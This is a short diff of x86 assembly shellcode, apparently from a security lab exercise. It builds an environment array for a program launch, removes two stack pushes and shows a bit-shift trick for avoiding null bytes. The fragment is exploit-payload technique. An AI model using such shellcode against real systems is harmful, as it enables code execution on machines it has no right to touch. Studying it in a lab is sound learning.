@@ -10,10 +10,10 @@ section .text
       mov  ebx, esp     ; Get the string address
 
       ; env[3] = 0          // 0 marks the end of the array
-      push eax          
+      ;push eax          
 
       ; env[2] = address to the "cccc=1234" string
-      push eax
+      ;push eax
       mov edi, "4###"
       shl edi, 24
       shr edi, 24
